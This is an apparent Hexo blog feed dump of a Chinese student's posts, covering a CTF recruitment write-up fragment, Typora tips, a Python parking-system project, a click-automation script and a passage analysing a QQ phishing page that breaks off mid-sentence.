   key <span class="token operator">=</span> generate_key<span class="token punctuation">(</span><span class="token punctuation">)</span>    msg <span class="token operator">=</span> <span class="token punctuation">[</span>        <span class="token number">22</span><span class="token punctuation">,</span>        <span class="token number">21</span><span class="token punctuation">,</span>        <span class="token number">167</span><span class="token punctuation">,</span>        <span class="token number">66</span><span class="token punctuation">,</span>        <span class="token number">9</span><span class="token punctuation">,</span>        <span class="token number">27</span><span class="token punctuation">,</span>        <span class="token number">3</span><span class="token punctuation">,</span>        <span class="token number">119</span><span class="token punctuation">,</span>        <span class="token number">42</span><span class="token punctuation">,</span>        <span class="token number">99</span><span class="token punctuation">,</span>        <span class="token number">68</span><span class="token punctuation">,</span>        <span class="token number">86</span><span class="token punctuation">,</span>        <span class="token number">13</span><span class="token punctuation">,</span>        <span class="token number">166</span><span class="token punctuation">,</span>        <span class="token number">3</span><span class="token punctuation">,</span>        <span class="token number">120</span><span class="token punctuation">,</span>        <span class="token number">22</span><span class="token punctuation">,</span>        <span class="token number">59</span><span class="token punctuation">,</span>        <span class="token number">9</span><span class="token punctuation">,</span>        <span class="token number">77</span><span class="token punctuation">,</span>        <span class="token number">40</span><span class="token punctuation">,</span>        <span class="token number">3</span><span class="token punctuation">,</span>        <span class="token number">233</span><span class="token punctuation">,</span>        <span class="token number">41</span><span class="token punctuation">,</span>        <span class="token number">67</span><span class="token punctuation">,</span>        <span class="token number">108</span><span class="token punctuation">,</span>        <span class="token number">80</span><span class="token punctuation">,</span>        <span class="token number">179</span><span class="token punctuation">,</span>        <span class="token number">86</span><span class="token punctuation">,</span>        <span class="token number">36</span><span class="token punctuation">,</span>        <span class="token number">31</span><span class="token punctuation">,</span>        <span class="token number">107</span><span class="token punctuation">,</span>        <span class="token number">77</span><span class="token punctuation">,</span>        <span class="token number">4</span><span class="token punctuation">,</span>        <span class="token number">75</span><span class="token punctuation">]</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'encryt message is {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>msg<span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p><code>lambda .0: continue[ i for i in .0 ]</code> 这个<code>.0</code>执行不了啊emmm</p><p>我换成x也报错唉！</p><h2 id="middle-pwn"><a href="#middle-pwn" class="headerlink" title="middle_pwn"></a>middle_pwn</h2><p><img src="/2019/11/28/CTF_2019Asuri_Recruitment/image-20191117213404793.png" alt="image-20191117213404793"></p><p><img src="/2019/11/28/CTF_2019Asuri_Recruitment/image-20191117213417542.png" alt="image-20191117213417542"></p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p><img src="/2019/11/28/CTF_2019Asuri_Recruitment/%E6%A6%9C%E5%8D%95.png" alt="榜单.png"> </p><p>第一次打CTF呢，虽然只拿了个第六，还拿了个娃娃233  </p><p>除了石榴园的真的没多少打这个比赛的呀。  </p><p>我好菜啊，这次一题pwn都没写出来，好难过嘤嘤嘤    </p><p>现场查BurpSuite怎么用也是绝了（那节培训我没去emmm   </p><p>总之CTF还是挺好玩的哈哈哈哈，有空还是要好好学一波呢！ </p><blockquote><p><del>等我有空再折腾一下，搭个博客吧 咕咕咕</del></p></blockquote><blockquote><p>20191128 更新：<br>我来折腾了，嘻嘻嘻！   </p></blockquote><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> WriteUp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>test</title>
      <link href="/2019/11/28/test/"/>
      <url>/2019/11/28/test/</url>
      
        <content type="html"><![CDATA[<h1 id="测试一下"><a href="#测试一下" class="headerlink" title="测试一下"></a>测试一下</h1><p>再来一下哈~</p><p>喵~~<br><strong>嘿嘿嘿</strong></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      
        <tags>
            
            <tag> test </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>typora_tips 一些关于typora的快捷键</title>
      <link href="/2019/08/29/typora_tips/"/>
      <url>/2019/08/29/typora_tips/</url>
      
        <content type="html"><![CDATA[<p>[TOC]</p><p>​        随便练练typora，参考了一些网上的资料，顺便记录一下，方便后面查阅哈~</p><h2 id="标题"><a href="#标题" class="headerlink" title="标题"></a><strong>标题</strong></h2><p><code>ctrl + 数字键</code></p><p>最多支持到六级标题</p><blockquote><h1 id="一级标题"><a href="#一级标题" class="headerlink" title="一级标题"></a>一级标题</h1></blockquote><blockquote><h2 id="二级标题"><a href="#二级标题" class="headerlink" title="二级标题"></a>二级标题</h2></blockquote><blockquote><h3 id="三级标题"><a href="#三级标题" class="headerlink" title="三级标题"></a>三级标题</h3></blockquote><blockquote><h4 id="四级标题"><a href="#四级标题" class="headerlink" title="四级标题"></a>四级标题</h4></blockquote><blockquote><h5 id="五级标题"><a href="#五级标题" class="headerlink" title="五级标题"></a>五级标题</h5></blockquote><blockquote><h6 id="六级标题"><a href="#六级标题" class="headerlink" title="六级标题"></a>六级标题</h6></blockquote><h3 id="取消标题"><a href="#取消标题" class="headerlink" title="取消标题"></a><strong>取消标题</strong></h3><p>​    <code>ctrl + 数字0</code></p><blockquote><h5 id="标题-1"><a href="#标题-1" class="headerlink" title="标题"></a>标题</h5><p>取消标题</p></blockquote><h2 id="加粗"><a href="#加粗" class="headerlink" title="加粗"></a><strong>加粗</strong></h2><p><code>ctrl + B</code></p><blockquote><p><strong>这是加粗</strong></p></blockquote><h2 id="倾斜"><a href="#倾斜" class="headerlink" title="倾斜"></a><strong>倾斜</strong></h2><p><code>ctrl + I</code></p><blockquote><p><em>这是倾斜</em></p></blockquote><h2 id="下划线"><a href="#下划线" class="headerlink" title="下划线"></a><strong>下划线</strong></h2><p><code>ctrl + U</code></p><blockquote><p><u>这是下划线</u></p></blockquote><h2 id="删除线"><a href="#删除线" class="headerlink" title="删除线"></a><strong>删除线</strong></h2><p><code>alt + shift + 5</code></p><blockquote><p><del>这是删除线</del></p></blockquote><hr><h2 id="无序列表"><a href="#无序列表" class="headerlink" title="无序列表"></a><strong>无序列表</strong></h2> <a id="more"></a> <p><code>- + space + enter</code></p><blockquote><ul><li><p>miao </p></li><li><p>miaomiao!</p><ul><li><p>嵌套</p><ul><li>再来嵌套</li></ul></li><li><p>上一个层次</p></li></ul></li><li><p>喵！</p></li></ul></blockquote><h2 id="有序列表"><a href="#有序列表" class="headerlink" title="有序列表"></a><strong>有序列表</strong></h2><p><code>数字键. + space + enter</code></p><ol><li>第一个</li><li>第二个<ol><li>嵌套一下</li><li>再来一下<ol><li>再嵌套一个</li></ol></li><li>继续</li></ol></li><li>继续来</li><li>就这样吧</li></ol><h2 id="任务列表"><a href="#任务列表" class="headerlink" title="任务列表"></a><strong>任务列表</strong></h2><p><code>- []</code> TODO</p><p><code>- [x]</code>已完成</p><blockquote><ul><li><input disabled="" type="checkbox"> 这是待完成的</li><li><input checked="" disabled="" type="checkbox"> 这个已完成了</li></ul></blockquote><hr><h2 id="引用"><a href="#引用" class="headerlink" title="引用"></a><strong>引用</strong></h2><p><code>&gt; + space + enter</code></p><p>或者</p><p><code>ctrl + shift + Q</code></p><blockquote><p>这就是引用</p></blockquote><blockquote><p>这也是</p><blockquote><p>​    还可以嵌套引用</p><blockquote><p>​    再来一个</p></blockquote><p>这也行</p></blockquote><p>一样的</p></blockquote><h2 id="插入图片"><a href="#插入图片" class="headerlink" title="插入图片"></a><strong>插入图片</strong></h2><p><code>ctrl + shift + I</code></p><p>网上说用<code>MPic</code>做图床挺不错的。（还没试过</p><p><img src="/2019/08/29/typora_tips/cat.jpg" alt="喵啊"></p><p>直接拖进来也行</p><h2 id="插入链接"><a href="#插入链接" class="headerlink" title="插入链接"></a><strong>插入链接</strong></h2><p><code>ctrl + K</code></p><blockquote><p><a href="https://miaotony.github.io" target="_blank" rel="noopener">这是链接，跳转到我的博客哈</a></p></blockquote><h2 id="插入表格"><a href="#插入表格" class="headerlink" title="插入表格"></a><strong>插入表格</strong></h2><p><code>ctrl + T</code></p><table><thead><tr><th>mm</th><th>text</th></tr></thead><tbody><tr><td>测试</td><td>再测试</td></tr><tr><td>123</td><td>456</td></tr></tbody></table><h2 id="插入代码"><a href="#插入代码" class="headerlink" title="插入代码"></a><strong>插入代码</strong></h2><h3 id="单行代码（文中的代码）"><a href="#单行代码（文中的代码）" class="headerlink" title="单行代码（文中的代码）"></a>单行代码（文中的代码）</h3><p>ctrl + shift + `</p><blockquote><p>`输入代码`</p></blockquote><h3 id="多行代码（代码块）"><a href="#多行代码（代码块）" class="headerlink" title="多行代码（代码块）"></a>多行代码（代码块）</h3><p><code>ctrl + shift + K</code></p><blockquote><p>``` </p><p>输入代码</p><p>```</p></blockquote><pre class=" language-python"><code class="language-python"><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Hello world!\n"</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># Python</span></code></pre><pre class=" language-c"><code class="language-c"><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Hello, this is C."</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// C</span></code></pre><pre class=" language-matlab"><code class="language-matlab"><span class="token function">disp</span><span class="token punctuation">(</span>"Hello<span class="token punctuation">,</span> this is MATLAB<span class="token punctuation">.</span>"<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">% MATLAB</span></code></pre><pre class=" language-lua"><code class="language-lua"><span class="token function">print</span><span class="token punctuation">(</span><span class="token string">"Hello, this is lua."</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">-- lua</span></code></pre><h2 id="插入表情"><a href="#插入表情" class="headerlink" title="插入表情"></a><strong>插入表情</strong></h2><p><code>:名称:</code></p><p>(英文状态下)</p><p><span class="github-emoji" style="color: transparent;background:no-repeat url(https://github.githubassets.com/images/icons/emoji/unicode/1f431.png?v8) center/contain" data-src="https://github.githubassets.com/images/icons/emoji/unicode/1f431.png?v8">🐱</span> <span class="github-emoji" style="color: transparent;background:no-repeat url(https://github.githubassets.com/images/icons/emoji/unicode/1f436.png?v8) center/contain" data-src="https://github.githubassets.com/images/icons/emoji/unicode/1f436.png?v8">🐶</span></p><p><img src="/2019/08/29/typora_tips/1.png" alt="示例"></p><p>PS：微软输入法可以用<code>ctrl + shift + B</code>弹出表情窗口。</p><p>😀👌</p><h2 id="插入分割线"><a href="#插入分割线" class="headerlink" title="插入分割线"></a><strong>插入分割线</strong></h2><p><code>---</code></p><blockquote><p>下面是分割线</p><hr></blockquote><h2 id="插入高亮显示"><a href="#插入高亮显示" class="headerlink" title="插入高亮显示"></a><strong>插入高亮显示</strong></h2><p><code>==中间写文字==</code></p><blockquote><p>==这是高亮==</p></blockquote><h2 id="插入脚注"><a href="#插入脚注" class="headerlink" title="插入脚注"></a><strong>插入脚注</strong></h2><p><code>文字[^脚注]</code></p><blockquote><p>示例<a href="这是脚注啦。">^1</a></p></blockquote><h2 id="插入公式"><a href="#插入公式" class="headerlink" title="插入公式"></a><strong>插入公式</strong></h2><p><code>ctrl + shift + M</code></p><p>或者</p><p>行内公式（内联公式）：  <code>$公式$</code></p><p>行间公式：     <code>$$ 公式 $$</code></p><p>$$<br>\lim_{x\to +\infty} \frac{1}{x}=0<br>$$<br>加个框试试（<code>\boxed{}</code>）：<br>$$<br>\boxed{ \overrightarrow{AB}}<br>$$</p><blockquote><p>这是行内公式 $ \sqrt[3]{test} $ ，妙啊~</p></blockquote><p>具体的还得慢慢看呢。</p><p>顺便学一波<code>LaTex</code>也挺不错的~</p><h2 id="插入目录"><a href="#插入目录" class="headerlink" title="插入目录"></a><strong>插入目录</strong></h2><p><code>[toc]  + ENTER</code></p><blockquote><p>就是最上面那个啦~</p></blockquote><hr><h2 id="新建文件"><a href="#新建文件" class="headerlink" title="新建文件"></a><strong>新建文件</strong></h2><p><code>ctrl + N</code>    </p><h2 id="选中中文-英文"><a href="#选中中文-英文" class="headerlink" title="选中中文/英文"></a><strong>选中中文/英文</strong></h2><p><code>ctrl + D</code></p><p>miao miao~ </p><p><code>ctrl + Shift + 左/右</code> 快速选中整个词语/单词。</p><h2 id="选中整行"><a href="#选中整行" class="headerlink" title="选中整行"></a><strong>选中整行</strong></h2><p><code>ctrl + L</code></p><h2 id="查找"><a href="#查找" class="headerlink" title="查找"></a><strong>查找</strong></h2><p><code>ctrl + F</code></p><h2 id="替换"><a href="#替换" class="headerlink" title="替换"></a><strong>替换</strong></h2><p><code>ctrl + H</code></p><h2 id="跳转到开头-结尾"><a href="#跳转到开头-结尾" class="headerlink" title="跳转到开头/结尾"></a><strong>跳转到开头/结尾</strong></h2><p><code>ctrl + HOME</code> 跳转至文章开头</p><p><code>ctrl + END</code>   跳转至文章末尾</p><h2 id="打开文件（笔记）"><a href="#打开文件（笔记）" class="headerlink" title="打开文件（笔记）"></a><strong>打开文件（笔记）</strong></h2><p><code>ctrl + P</code></p><h2 id="全屏显示"><a href="#全屏显示" class="headerlink" title="全屏显示"></a><strong>全屏显示</strong></h2><p><code>F11</code></p><h2 id="侧边栏"><a href="#侧边栏" class="headerlink" title="侧边栏"></a><strong>侧边栏</strong></h2><p><code>ctrl + shift + L</code></p><h2 id="清除格式"><a href="#清除格式" class="headerlink" title="清除格式"></a><strong>清除格式</strong></h2><p><code>ctrl + \</code></p><h2 id="切换到代码模式"><a href="#切换到代码模式" class="headerlink" title="切换到代码模式"></a><strong>切换到代码模式</strong></h2><p><code>ctrl + /</code></p><p><strong><em>==etc.==</em></strong></p><p>还有挺多还要慢慢去发掘呢~</p><hr><p>顺便说一下</p><p><code>Snipaste</code> 这个截图工具挺强大的</p><p><a href="https://zh.snipaste.com/" target="_blank" rel="noopener">官网</a> <a href="https://zh.snipaste.com/" target="_blank" rel="noopener">https://zh.snipaste.com/</a></p><blockquote><p>本文搬运自我的csdn博客啦~</p></blockquote><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> tips </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tips </tag>
            
            <tag> Markdown </tag>
            
            <tag> Typora </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>小想法 | 开源一个自己的Python小项目「Park at ease」停车场管理系统</title>
      <link href="/2019/08/18/Park_at_ease/"/>
      <url>/2019/08/18/Park_at_ease/</url>
      
        <content type="html"><![CDATA[<h1 id="Park-at-ease"><a href="#Park-at-ease" class="headerlink" title="Park at ease"></a>Park at ease</h1><p><strong>停车场管理系统</strong><br><em>基于Python实现</em>  </p><p><strong>Park Management System</strong><br><em>Based on Python…</em>    </p><pre class=" language-python"><code class="language-python"><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Hello, this is Park_at_ease!'</span><span class="token punctuation">)</span></code></pre><p><img src="/2019/08/18/Park_at_ease/20190818195449125.png" alt="运行界面"></p><h2 id="一些说明"><a href="#一些说明" class="headerlink" title="一些说明"></a>一些说明</h2><p>这个项目本来是给部门里小干事布置的《2019寒假进阶指南》里 Section2 的课设任务（题目基本上是根据自己的想法出的），当时自己正好在学Python，就想拿这个项目练练手，于是就有了这个基于Python面向对象实现的停车场管理系统。  </p><p>原来这个项目都是自己弄着玩的，这几天整理文件发现几个月前还写了这玩意儿，还挺有意思的。<br>这个项目其实还有很多可以开发的空间的，于是就想着把它开源了吧，希望大家可以一起来完善呢！  </p><p><em>PS:原则上不提供技术支持哈。</em></p><hr><p><strong>项目网站（基于Github Pages搭建）：</strong><br><a href="https://miaotony.github.io/Park_at_ease/" target="_blank" rel="noopener">来点我哈</a> 或 <a href="https://miaotony.github.io/Park_at_ease/" target="_blank" rel="noopener">https://miaotony.github.io/Park_at_ease/</a></p><p><strong>GitHub项目网址：</strong><br><a href="https://github.com/miaotony/Park_at_ease" target="_blank" rel="noopener">来点我鸭</a> 或 <a href="https://github.com/miaotony/Park_at_ease" target="_blank" rel="noopener">https://github.com/miaotony/Park_at_ease</a></p><p>欢迎大家在此基础上继续完善鸭~<br><strong>欢迎Star、Fork、提PR &amp; issue！</strong></p><p><strong>使用及转载时请注明出处，保留作者信息，严禁商用，严禁用于完成课设任务，谢谢！</strong>  </p><hr><h2 id="Overview"><a href="#Overview" class="headerlink" title="Overview"></a>Overview</h2> <a id="more"></a> <p>这是编者参考了一小部分网络上相关的题目，结合实际生活，融合了自己一些想到的，给小干事们出的题目。<br>这里直接就截屏放出来吧，PDF还有别的内容懒得改了。<br>如果有什么建议<strong>欢迎在GitHub上提issue</strong>或者<strong>在这里评论</strong>哈~！  </p><p><img src="/2019/08/18/Park_at_ease/20190818165341354.png" alt="20190818165341354">  </p><p><img src="/2019/08/18/Park_at_ease/20190818165453514.png" alt="20190818165453514"></p><p><img src="/2019/08/18/Park_at_ease/20190818165508495.png" alt="20190818165508495"></p><p><img src="/2019/08/18/Park_at_ease/20190818165517893.png" alt="20190818165517893"></p><p><img src="/2019/08/18/Park_at_ease/20190818165530183.png" alt="20190818165530183"></p><p><img src="/2019/08/18/Park_at_ease/20190818165538685.png" alt="20190818165538685"></p><p><img src="/2019/08/18/Park_at_ease/20190818165548553.png" alt="20190818165548553"></p><hr><h2 id="TODO"><a href="#TODO" class="headerlink" title="TODO"></a>TODO</h2><ul><li><input checked="" disabled="" type="checkbox"> 管理员界面 Administrator Interface  </li><li><input checked="" disabled="" type="checkbox"> 文件操作 FileIO</li><li><input checked="" disabled="" type="checkbox"> 登录界面 Login  </li><li><input disabled="" type="checkbox"> 登录加密 Login Encryption</li><li><input disabled="" type="checkbox"> 图形界面 GUI  </li><li><input disabled="" type="checkbox"> 多线程或多进程 Multithreading or Multiprocessing  </li><li><input disabled="" type="checkbox"> 邮件推送 Email Push  </li><li><input disabled="" type="checkbox"> 微信推送 WeChat Push  </li><li><input disabled="" type="checkbox"> TCP  </li><li><input disabled="" type="checkbox"> 嵌入式开发 Embedded Development<br>  etc.  </li></ul><hr><p><strong>具体请移步到GitHub鸭！</strong></p><p><strong>项目网站（基于Github Pages搭建）：</strong><br><a href="https://miaotony.github.io/Park_at_ease/" target="_blank" rel="noopener">来点我哈</a> 或 <a href="https://miaotony.github.io/Park_at_ease/" target="_blank" rel="noopener">https://miaotony.github.io/Park_at_ease/</a></p><p><strong>GitHub项目网址：</strong><br><a href="https://github.com/miaotony/Park_at_ease" target="_blank" rel="noopener">来点我鸭</a> 或 <a href="https://github.com/miaotony/Park_at_ease" target="_blank" rel="noopener">https://github.com/miaotony/Park_at_ease</a></p><p><img src="/2019/08/18/Park_at_ease/20190818195154540.png" alt="喵~"></p><p>溜了溜了<br>下次再见啦~</p><blockquote><p>搬运自我的csdn博客啦~</p></blockquote><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> Tech </category>
          
          <category> Projects </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 小想法 </tag>
            
            <tag> Python </tag>
            
            <tag> Projects </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>小想法 | 基于模拟点击实现数据自动测量</title>
      <link href="/2019/07/10/Idea_AutoMeasure/"/>
      <url>/2019/07/10/Idea_AutoMeasure/</url>
      
        <content type="html"><![CDATA[<blockquote><p>搬运一篇之前写的小想法啦~</p></blockquote><h2 id="起因"><a href="#起因" class="headerlink" title="起因"></a>起因</h2><p>人工智能——先人工后智能<br>哪里有现成数据给你<br>还不是人工手动去测……  </p><p>大创要测数据emmm，简单来说就是点点按钮，等它数据测量完成，然后按照命名规范保存。<br>就是这个也太枯燥了8，效率还低。<br>不如py一下写个自动执行的！<br>说写就写呗<em>（斜眼笑.gif)</em>  </p><h2 id="初代版本"><a href="#初代版本" class="headerlink" title="初代版本"></a>初代版本</h2><p>发现Python有个现成的第三方库叫<code>PyAutoGui</code>库，它给的函数还是挺方便的。<br>按照测数据操作的流程用代码还原一遍，测试发现速度太快了电脑吃不消，于是乎到处加延时233。  </p><p>总之还是挺不错的吧<br>输入<strong>角度、次数、开始index</strong>（程序崩的时候备用），<br>然后就可以自动开始测量，新建文件夹，按顺序命名保存。  </p><p><img src="/2019/07/10/Idea_AutoMeasure/code.png" alt="code1"></p><p><img src="/2019/07/10/Idea_AutoMeasure/code2.png" alt="code2"></p><p><img src="/2019/07/10/Idea_AutoMeasure/code3.png" alt="code3"></p><p>理论一天可测的数据量从270组提高到435组，<strong>效率提升了61%吧！</strong>  </p><p>还要感谢潇潇弟弟陪我debug 嘻嘻嘻~  </p><hr><h2 id="升级版"><a href="#升级版" class="headerlink" title="升级版"></a>升级版</h2><blockquote><p><em>Update on 20190725.</em></p></blockquote><p>之前写的自动测数据的程序还有点小问题，今天又更新了两个版本。。</p><p>由于测量软件的问题，每组都会漏一些数据，所以还要手动补测。</p><p>于是乎今天加了个文件是否存在的判断，确定保存成功之后才继续下一组测量，这样就不用补测了！  </p><p>另外还加入了log，记录日志文件方便检查错误。</p><p>嘿嘿嘿~</p><p><img src="/2019/07/10/Idea_AutoMeasure/update1.png" alt="update"></p><p><img src="/2019/07/10/Idea_AutoMeasure/update2.png" alt="运行界面"></p><p><img src="/2019/07/10/Idea_AutoMeasure/log.png" alt="log"></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> Tech </category>
          
          <category> Projects </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 小想法 </tag>
            
            <tag> 模拟点击 </tag>
            
            <tag> 大创 </tag>
            
            <tag> 自动 </tag>
            
            <tag> Python </tag>
            
            <tag> Projects </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第一篇 随便写写</title>
      <link href="/2019/07/09/FirstBlog/"/>
      <url>/2019/07/09/FirstBlog/</url>
      
        <content type="html"><![CDATA[<blockquote><blockquote><p>搬运自我的CSDN博客 </p></blockquote><p>这篇可以算是第一次公开发出来的吧<br><em>（其实严格来说也不算啦，只是之前发的年份过久估计都404或者找不到了233</em></p></blockquote><pre class=" language-python"><code class="language-python"><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Hello, everyone!"</span><span class="token punctuation">)</span></code></pre><h2 id="Why"><a href="#Why" class="headerlink" title="Why?"></a>Why?</h2><p>  上了大学之后，做大作业、写论文、写报告、做项目、参加各种比赛，经常需要各种找资料，大多是<em>EE</em>和<em>CS</em>方向的。</p><p>这时候经常就逛到CSDN、博客园、简书、逼乎之类的这些，或者大佬们自己搭建的博客，当然还有B站这样有着各种学习视频的好地方。</p><p>大家都乐于把自己的体会和经验分享出来，对于我这样的菜鸡来说帮助很大鸭。比如说码着码着代码遇到啥bug了，然后上来一查，很多时候别人也遇到过，于是乎什么情况下遇到的、如何解决的大都有了，很方便就能解决问题呢。</p><p>其实本来就觉得写点东西挺有意思的，特别是看到身边的小伙伴在CSDN上也开了自己的账号，开始分享自己的一些 debug 经历以及生活常事，越发觉得挺有意思的也挺有意义的。于是我也来写一写呗。 </p><p>登录的时候突然才发现，CSDN上我的账号原来7年前就注册了，估计之前还只是随便逛逛以及下载些资料，都没有在这儿写过啥东西233。没事问题不大哈哈哈。</p><hr><h2 id="When"><a href="#When" class="headerlink" title="When?"></a>When?</h2><p>其实之前有啥小想法或者小制作，都是随便写两句话讲讲到空间……<br>当然，<strong>有想法</strong> &amp;&amp; <strong>有空</strong> 的时候，就来这儿写点东西吧！</p><hr><h2 id="What"><a href="#What" class="headerlink" title="What?"></a>What?</h2><p>其实我感兴趣的东西挺多的 emmm<br>比如说大体说一说嘛：</p><ul><li><h4 id="嵌入式相关"><a href="#嵌入式相关" class="headerlink" title="嵌入式相关"></a>嵌入式相关</h4><ul><li>MCU单片机</li><li>FPGA</li><li>物联网 IoT<ul><li>ESP8266<br>（准备好好研究一波，可以单独列一列）</li></ul></li></ul></li><li><h4 id="编程"><a href="#编程" class="headerlink" title="编程"></a>编程</h4><ul><li>Python 以及各种库</li><li>MATLAB  </li></ul></li><li><h4 id="人工智能-AI"><a href="#人工智能-AI" class="headerlink" title="人工智能 AI"></a>人工智能 AI</h4><ul><li>机器学习 Machine Learning，ML </li></ul></li><li><h4 id="计算机视觉-Computer-Vision，CV"><a href="#计算机视觉-Computer-Vision，CV" class="headerlink" title="计算机视觉 Computer Vision，CV"></a>计算机视觉 Computer Vision，CV</h4></li><li><h4 id="数据分析与挖掘"><a href="#数据分析与挖掘" class="headerlink" title="数据分析与挖掘"></a>数据分析与挖掘</h4><ul><li>数据获取（如爬虫虫）</li><li>数据可视化</li></ul></li><li><p>数据挖掘</p></li><li><h4 id="微信小程序开发"><a href="#微信小程序开发" class="headerlink" title="微信小程序开发"></a>微信小程序开发</h4></li><li><h4 id="前端尝个鲜"><a href="#前端尝个鲜" class="headerlink" title="前端尝个鲜"></a>前端尝个鲜</h4></li><li><h4 id="视频制作"><a href="#视频制作" class="headerlink" title="视频制作"></a>视频制作</h4></li><li><p>etc.</p></li></ul><p>其实就是啥都想玩一玩，感觉能做的就去尝试尝试，特别是那种接近实际的。<br>于是乎就<strong>想写啥就写啥</strong>呗。<br>不过基本上以小想法为主，就是随便记录一下这样吧。  </p><hr><p><strong>好啦第一篇就这样随便写写了。<br>溜啦溜啦~</strong></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> Blog </category>
          
      </categories>
      
      
        <tags>
            
            <tag> blog </tag>
            
            <tag> Life </tag>
            
            <tag> 小想法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>小想法 | 某QQ空间盗号页面分析</title>
      <link href="/2019/03/30/Idea_AnalysisOfHackingPage/"/>
      <url>/2019/03/30/Idea_AnalysisOfHackingPage/</url>
      
        <content type="html"><![CDATA[<blockquote><p>搬运自之前的小脑洞小想法啦      </p></blockquote><h2 id="起因"><a href="#起因" class="headerlink" title="起因"></a>起因</h2><p>昨晚有个小伙伴空间里把列表都at了（后来知道的），附带P1这张图。  </p><p><img src="/2019/03/30/Idea_AnalysisOfHackingPage/1.jpg" alt="1"></p><p>然后感觉不对劲，肯定是被盗号了。  </p><p>然后突然有个脑洞，去看看这里面有啥吧  </p><h2 id="折腾记录"><a href="#折腾记录" class="headerlink" title="折腾记录"></a>折腾记录</h2><p>用扫码工具（千万别拿QQ来扫，虽然这次的链接没啥大影响）得到二维码文字内容，发现是类似<code>url.cn/...</code>的短链接。</p><p><img src="/2019/03/30/Idea_AnalysisOfHackingPage/2.jpg" alt="2"></p><p>用电脑浏览器打开，同时打开调试窗口，发现短链接跳转到一个Github.io的页面（P3），很明显是GitHub Pages。   </p><p><img src="/2019/03/30/Idea_AnalysisOfHackingPage/3.png" alt="3"></p><p>于是去GitHub上查找该用户，发现只有个项目，里面就只有一个index.html文件，对应着P2页面，最新版本还是昨天提交的（P4）。   </p><p><img src="/2019/03/30/Idea_AnalysisOfHackingPage/4.png" alt="4"></p><p>感觉不对，于是改变 User Agent 为手机，重新访问短链接，跳转P5页面，是个伪QQ空间登录界面，果然是个钓鱼页面233。 </p><p><img src="/2019/03/30/Idea_AnalysisOfHackingPage/5.png" alt="5"></p><p>点击一键登录，延时一会儿会提示 请安装最新版本QQ 。【忘了密码】及【注册新账号】都是跳转到QQ官方的页面。然后输个123456789啥的测试一下，还会提示 请输入正确账号或者密码 啥的（P6）。  </p><p><img src="/2019/03/30/Idea_AnalysisOfHackingPage/6.png" alt="6"></p><p>乱输一个987321654，噫进去了，跳转到了真的QQ空间，虽然并没有真的登录（P7）。  </p><p><img src="/2019/03/30/Idea_AnalysisOfHackingPage/7.png" alt="7"></p><p>而后在调试窗口network下找了半天，都没发现我提交的账号密码。（P8-9）</p><p><img src="/2019/03/30/Idea_AnalysisOfHackingPage/8.png" alt="8"></p><p><img src="/2019/03/30/Idea_AnalysisOfHackingPage/9.png" alt="9"></p><p>顺着remote 